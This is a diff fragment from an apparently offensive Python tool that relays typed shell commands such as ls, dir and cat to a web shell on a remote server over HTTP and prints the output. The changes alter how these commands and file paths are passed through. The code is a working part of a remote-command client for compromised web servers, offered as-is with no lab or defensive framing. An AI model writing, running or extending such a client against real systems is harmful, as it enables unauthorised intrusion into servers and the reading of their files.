@@ -91,19 +91,19 @@ try:
                             path = command.split()[1]   
                    else:
                       if "ls" in command.split()[0] or "dir" in command.split()[0]:
-                         if slash in command or "-" in command:
-                            content = send_command("ls " + command.split()[1], WEBSHELL, HTTP_METHOD, PARAM)
+                         if slash in command:
+                            content = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
                             print (colored(content, "yellow"))
                          else:
-                            content = send_command("ls " + path.rstrip(), WEBSHELL, HTTP_METHOD, PARAM)
+                            content = send_command(command + " " + path.rstrip(), WEBSHELL, HTTP_METHOD, PARAM)
                             print (colored(content, "yellow"))
                       else:
                          if "cat" in command.split()[0]:
-                            if slash in command or "-" in command:
-                               content = send_command("cat " + command.split()[1], WEBSHELL, HTTP_METHOD, PARAM)
+                            if slash in command:
+                               content = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
                                print (colored(content, "yellow"))
                             else:
-                               content = send_command("cat " + path.rstrip() + slash + command.split()[1], WEBSHELL, HTTP_METHOD, PARAM)
+                               content = send_command(command.split()[0] + " " + path.rstrip() + slash + command.split()[1], WEBSHELL, HTTP_METHOD, PARAM)
                                print (colored(content, "yellow"))
                          else:
                             if args.ps:
